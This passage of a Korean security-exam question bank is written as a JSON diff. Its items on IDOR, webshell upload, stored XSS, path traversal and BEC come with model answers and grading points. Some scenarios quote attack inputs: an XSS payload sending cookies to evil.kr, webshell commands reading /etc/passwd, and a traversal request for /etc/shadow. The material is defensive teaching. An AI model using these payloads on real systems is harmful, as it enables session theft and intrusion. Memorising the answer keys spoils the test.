+      "answer": "정답\n(a) 안전하지 않은 직접 객체 참조(IDOR, Insecure Direct Object Reference). OWASP Top 10 2021 의 A01: Broken Access Control 에 해당.\n\n(b) 서버가 `docId` 로 자원을 조회할 때, 요청한 사용자가 그 자원에 접근할 '권한이 있는지'를 검증하지 않고 식별자만으로 데이터를 반환하기 때문이다. 접근통제 로직이 클라이언트가 보낸 식별자를 신뢰한다.\n\n(c)\n1. 모든 자원 접근에 서버 측 인가 검증 — 세션의 사용자와 자원 소유자/공개 범위를 대조.\n2. 사용자별 접근 가능 목록(스코프) 내에서만 조회하도록 쿼리에 소유자 조건 추가(`WHERE docId=? AND (writerId=? OR isPublic=1)`).\n3. 간접 참조 맵(사용자 세션에 한정된 임시 인덱스 → 실제 ID 매핑) 사용.\n4. 접근 실패·비정상 순차 접근 로깅·탐지, 자동화 스캐닝 차단(Rate limit).\n\n(d) 완전한 해결책이 아니다. UUID 는 식별자 '추측'을 어렵게 할 뿐(security by obscurity), URL·리퍼러·로그·공유를 통해 UUID 가 유출되면 여전히 무단 열람이 가능하다. 근본 해결은 매 요청마다 서버 측 인가(권한) 검증을 수행하는 것이다.",
+      "explanation": "채점 포인트: (a) IDOR / Broken Access Control (b) 인가 검증 부재·식별자 신뢰 (c) 서버 측 인가·소유자 조건 쿼리·간접 참조·로깅 중 3개 (d) UUID 는 완전 해결 아님(추측 방지일 뿐, 유출 시 무력·서버 인가가 근본).",
+      "notes": [
+        "애플리케이션보안/owasp-top10과-시큐어-sdlc",
+        "애플리케이션보안/웹취약점-진단도구와-테스트기법"
+      ],
+      "tags": [
+        "IDOR",
+        "접근통제",
+        "인가",
+        "취약점진단"
+      ]
+    },
+    {
+      "id": "y-app-022",
+      "type": "실무형",
+      "question": "Apache 웹서버의 접근 로그에서 다음이 발견되었다.\n\n```\n203.0.113.7 - - [12/Jul/2026:03:14:22 +0900] \"GET /board/upload/2026/07/photo.php.jpg HTTP/1.1\" 200 132\n203.0.113.7 - - [12/Jul/2026:03:14:40 +0900] \"GET /board/upload/2026/07/photo.php.jpg?cmd=id HTTP/1.1\" 200 41\n203.0.113.7 - - [12/Jul/2026:03:15:02 +0900] \"GET /board/upload/2026/07/photo.php.jpg?cmd=cat+/etc/passwd HTTP/1.1\" 200 1893\n```\n\n웹서버 설정에는 `AddHandler application/x-httpd-php .php` 가 있고, 업로드 디렉터리는 웹 루트 하위이며 파일명 검증은 확장자 블랙리스트(`.php` 금지)만 수행한다.\n\n(a) 공격 시나리오를 설명하시오.\n(b) `photo.php.jpg` 가 PHP 로 실행된 이유를 설정과 연관지어 쓰시오.\n(c) 재발 방지 대책을 5가지 이상 제시하고, 사고 대응 절차를 간단히 쓰시오.",
+      "answer": "정답\n(a) 공격자가 파일 업로드 기능의 확장자 블랙리스트(`.php` 만 금지)를 우회해 `photo.php.jpg` 라는 이름의 PHP 웹셸을 업로드했고(200), 이후 `?cmd=` 파라미터로 임의 명령을 실행(`id`, `cat /etc/passwd`)하여 서버 정보를 탈취하고 있다. 세 번째 요청의 응답 크기(1893)가 커진 것은 /etc/passwd 내용이 반환되었음을 시사한다.\n\n(b) Apache `AddHandler application/x-httpd-php .php` 는 파일명에 `.php` 가 '포함'되면(마지막 확장자가 아니어도) PHP 핸들러로 처리하는 경우가 있어(멀티 확장자), `photo.php.jpg` 가 PHP 로 해석·실행되었다. 또한 업로드 디렉터리가 웹 루트 하위여서 URL 로 직접 접근·실행이 가능했다.\n\n(c) 재발 방지\n1. 업로드 파일은 웹 루트 밖의 저장소에 보관하고, 다운로드는 스크립트를 통해 스트리밍(직접 URL 접근 차단).\n2. 확장자 '허용 목록'(jpg/png/pdf 등)만 통과, 파일명은 서버가 난수로 재생성.\n3. 매직 바이트(파일 시그니처)·MIME 검증, 이미지의 경우 재인코딩(리사이즈)으로 내장 코드 제거.\n4. 업로드 디렉터리에서 스크립트 실행 비활성: `<Directory>` 에 `php_admin_flag engine off`, `RemoveHandler .php .phtml`, `Options -ExecCGI`.\n5. `AddHandler`/`AddType` 을 마지막 확장자만 인식하도록 조정, `.php`, `.phtml`, `.phar` 등 전체 차단.\n6. WAF 로 웹셸 패턴·의심 업로드 차단, 안티바이러스 스캔.\n\n사고 대응: 서버 격리 → 웹셸·변조 파일 식별·격리, 해시 확보 → 접근 로그로 침투 시점·행위·확산 파악 → 노출 자격증명·개인정보 확인 및 통지 → 취약점 패치 후 검증된 백업으로 복구 → 재발방지 대책 및 모니터링 강화.",
+      "explanation": "채점 포인트: (a) 확장자 우회 웹셸 업로드 + cmd 파라미터 RCE + passwd 유출 (b) AddHandler 멀티확장자 + 웹루트 하위 저장 (c) 웹루트 밖 저장·허용목록·매직바이트·실행 비활성·핸들러 조정 중 5개 + 격리→분석→통지→복구 절차.",
+      "notes": [
+        "애플리케이션보안/파일업로드-취약점",
+        "애플리케이션보안/아파치-웹서버-보안설정과-로그",
+        "애플리케이션보안/인젝션-웹셸-요청위조-스머글링"
+      ],
+      "tags": [
+        "파일업로드",
+        "웹셸",
+        "AddHandler",
+        "로그분석",
+        "침해대응"
+      ]
+    },
+    {
+      "id": "y-app-023",
+      "type": "실무형",
+      "question": "쇼핑몰 웹사이트에서 다음 현상이 보고되었다.\n\n- 여러 회원이 \"내 계정으로 로그인한 적 없는데 배송지가 바뀌고 포인트가 사용됨\"이라고 신고\n- 공통점: 최근 특정 이벤트 페이지(`event.jsp`)의 후기 게시판에 올라온 글을 열람함\n- 후기 글 소스: `<img src=x onerror=\"new Image().src='//evil.kr/c?'+document.cookie\">`\n- 회원 세션 쿠키에 HttpOnly 속성 없음, 사이트 전체 HTTP(비 HTTPS) 운영\n\n(a) 공격 유형과 단계별 진행 과정을 설명하시오.\n(b) 피해가 확산된 기술적 원인 3가지를 지적하시오.\n(c) 단기·장기 대응책을 구분하여 제시하시오.",
+      "answer": "정답\n(a) 저장형 XSS(Stored XSS)를 통한 세션 쿠키 탈취 → 세션 하이재킹. 진행: ①공격자가 후기 게시판에 악성 스크립트(`onerror` 이벤트)를 저장 → ②정상 회원이 해당 글을 열람하면 브라우저에서 스크립트 실행 → ③`document.cookie`(세션 ID)가 공격자 서버(evil.kr)로 전송 → ④공격자가 탈취한 세션 쿠키로 회원 계정에 접근해 배송지 변경·포인트 사용.\n\n(b) 확산 원인\n1. 게시판 입력값에 대한 서버 측 필터링·출력 인코딩 부재 → 스크립트가 그대로 저장·렌더링.\n2. 세션 쿠키에 HttpOnly 속성이 없어 `document.cookie` 로 스크립트가 쿠키를 읽을 수 있음.\n3. 전 구간 HTTP(비암호화) 운영 → Secure 속성도 없어 쿠키가 평문 전송되고, 중간자 도청 위험도 상존.\n(추가: CSP 헤더 부재로 외부 도메인으로의 데이터 전송이 차단되지 않음.)\n\n(c)\n[단기]\n- 해당 악성 게시글 즉시 삭제, event.jsp 후기 게시판 임시 비공개.\n- 전 회원 세션 강제 만료(재로그인 유도), 의심 IP 차단, evil.kr 도메인 아웃바운드 차단.\n- 피해 회원 통지·배송지/포인트 원복, 개인정보 유출 여부 확인 및 신고(72시간 이내).\n[장기]\n- 모든 사용자 입력에 대한 검증 + 출력 시 컨텍스트별 인코딩, 리치 텍스트는 허용 태그 화이트리스트(sanitizer).\n- 세션 쿠키에 HttpOnly·Secure·SameSite 적용, 전 사이트 HTTPS 전환(HSTS).\n- CSP 헤더 도입(`default-src 'self'`, 인라인 스크립트 차단), 정기 취약점 진단, WAF.\n- 로그인 이상 탐지(새 기기·IP), 중요 변경 시 재인증.",
+      "explanation": "채점 포인트: (a) 저장형 XSS → 쿠키 탈취 → 세션 하이재킹 4단계 (b) 입력필터/출력인코딩 부재 + HttpOnly 없음 + HTTP 운영 (c) 단기(글 삭제·세션 만료·통지·신고) / 장기(인코딩·HttpOnly·HTTPS·CSP·진단). 개인정보 유출 신고 언급 시 가점.",
+      "notes": [
+        "애플리케이션보안/xss-csrf",
+        "정보보안관리및법규/개인정보-안전성확보조치"
+      ],
+      "tags": [
+        "StoredXSS",
+        "세션하이재킹",
+        "HttpOnly",
+        "CSP",
+        "침해대응"
+      ]
+    },
+    {
+      "id": "y-app-024",
+      "type": "실무형",
+      "question": "내부 감사에서 사내 파일 다운로드 API 가 다음과 같이 구현된 것을 발견했다.\n\n```\nGET /api/download?path=reports/2026/q2.pdf\n→ 서버: File f = new File(\"/var/appdata/\" + request.getParameter(\"path\")); return f;\n```\n\n테스트로 `path=../../../../etc/shadow` 를 요청하자 파일 내용이 반환되었다.\n\n(a) 취약점 명칭과 위험을 쓰시오.\n(b) 안전한 코드로 수정하는 방법을 구체적으로 서술하시오(정규화·검증 관점).\n(c) 이 API 를 통해 공격자가 시도할 수 있는 추가 행위 2가지를 쓰시오.",
+      "answer": "정답\n(a) 경로 조작 / 디렉터리 트래버설(Path Traversal, Local File Inclusion). 사용자 입력(`path`)이 파일 경로에 검증 없이 결합되어, `../` 로 상위 디렉터리를 벗어나 `/etc/shadow`, 설정 파일, 소스코드, 인증서 등 서버의 임의 파일을 읽을 수 있다. `/etc/shadow` 유출 시 오프라인 패스워드 크래킹으로 이어진다.\n\n(b) 안전한 구현\n1. 입력에서 경로 구분자·상위 참조 제거: 파일명만 허용(디렉터리 구성 요소 금지), `..`·`/`·`\\`·널바이트·URL 인코딩(`%2e%2e%2f`) 차단.\n2. 정규화 후 검증: 기준 디렉터리와 결합한 뒤 `getCanonicalPath()` 로 정규화하고, 그 결과가 허용 기준 디렉터리(`/var/appdata/`)의 하위 경로로 시작하는지 확인(startsWith). 아니면 거부.\n3. 화이트리스트/간접 참조: 다운로드 가능한 파일을 DB 에 등록하고 `path` 대신 `fileId` 를 받아 서버가 실제 경로로 매핑.\n4. 최소 권한: 애플리케이션 프로세스가 `/var/appdata` 외 파일을 못 읽도록 OS 권한·chroot·컨테이너 격리.\n5. 접근 인가 검증(요청자가 해당 파일 권한 보유 여부), 접근 로깅.\n\n(c) 추가 행위\n1. 소스코드·설정 파일(DB 접속 정보, API 키, `application.properties`) 열람 → 2차 공격(DB 접속, 클라우드 자격 탈취).\n2. `/proc/self/environ`, 로그 파일 열람으로 세션·비밀 획득, 또는 LFI 를 이용한 로그 포이즈닝 → 원격 코드 실행 시도.",
+      "explanation": "채점 포인트: (a) Path Traversal/LFI + /etc/shadow 유출 위험 (b) 경로 구분자 제거 + getCanonicalPath 정규화 후 startsWith 검증 + fileId 간접참조 + 최소권한(핵심은 '정규화 후 기준 디렉터리 포함 확인') (c) 설정/소스 유출 → 2차공격, 로그 포이즈닝/proc 등 2개.",
+      "notes": [
+        "애플리케이션보안/인젝션-웹셸-요청위조-스머글링",
+        "애플리케이션보안/파일업로드-취약점"
+      ],
+      "tags": [
+        "PathTraversal",
+        "LFI",
+        "정규화",
+        "시큐어코딩"
+      ]
+    },
+    {
+      "id": "y-app-025",
+      "type": "실무형",
+      "question": "회사 메일 도메인(example.co.kr)을 사칭한 사장 명의의 송금 요청 메일(BEC)이 재무팀에 수신되었다. 조사 결과:\n\n- 메일 헤더 `From: ceo@example.co.kr`, 실제 `Return-Path: attacker@gmail-secure.com`\n- 수신 서버의 SPF 검사 결과: `spf=fail`\n- example.co.kr 의 DNS 에는 SPF 레코드가 `v=spf1 include:_spf.google.com ~all` 로 설정, DKIM·DMARC 레코드는 없음\n\n(a) 이 공격이 수신자에게 전달된(차단되지 않은) 이유를 SPF 정책과 연관지어 설명하시오.\n(b) example.co.kr 이 자기 도메인 사칭을 막기 위해 추가·수정해야 할 DNS 설정을 구체적으로 쓰시오.\n(c) 기술적 통제 외에 조직 차원의 BEC 대응책 2가지를 제시하시오.",
+      "answer": "정답\n(a) SPF 레코드가 `~all`(Soft Fail)로 끝나 있어, 인가되지 않은 서버에서 온 메일이라도 '거부'가 아니라 '의심(soft fail)'으로만 표시되어 수신 서버가 차단하지 않고 스팸함/받은편지함으로 전달했을 수 있다. 또한 SPF 는 `Return-Path`(Envelope From) 도메인을 검사하는데, 표시되는 `From:` 헤더는 검사하지 않아 헤더 사칭을 막지 못한다. DMARC 가 없어 헤더 From 정렬(alignment) 검증과 실패 시 정책 강제도 이루어지지 않았다.\n\n(b) DNS 설정\n1. SPF 를 하드 페일로: `v=spf1 include:_spf.google.com -all` (인가 외 서버는 거부).\n2. DKIM 설정: 메일 서버에서 서명 키를 생성하고 `selector._domainkey.example.co.kr` TXT 에 공개키 게시, 발신 메일에 DKIM-Signature 추가.\n3. DMARC 레코드 추가: `_dmarc.example.co.kr` TXT 에 `v=DMARC1; p=quarantine; rua=mailto:dmarc@example.co.kr; adkim=s; aspf=s` → 검증 후 `p=reject` 로 상향. 이렇게 하면 헤더 From 이 example.co.kr 인 미인증 메일을 수신 측이 거부/격리한다.\n\n(c) 조직 대응\n1. 송금·계좌 변경 등 중요 재무 처리는 메일 단독으로 승인하지 않고, 사전에 등록된 연락처로의 유선 확인 등 이중 승인(콜백) 절차를 의무화.\n2. 임직원 대상 BEC·피싱 모의훈련과 인식 제고, 외부 발신 메일에 경고 배너 표시, 유사 도메인(타이포스쿼팅) 모니터링·선점.",
+      "explanation": "채점 포인트: (a) `~all` soft fail 로 미차단 + SPF 는 Envelope-From 검사(헤더 From 사칭 못 막음) + DMARC 부재 (b) `-all` + DKIM 공개키 + DMARC(p=quarantine→reject, 정렬) (c) 이중 승인/콜백 + 모의훈련·경고배너·유사도메인 관리.",
+      "notes": [
+        "애플리케이션보안/메일보안-spf-dkim-dmarc",
+        "네트워크보안/apt-킬체인-악성코드"
+      ],
+      "tags": [
+        "BEC",
+        "SPF",
+        "DMARC",
+        "메일사칭",
+        "피싱"
+      ]
+    }
+  ]
+}
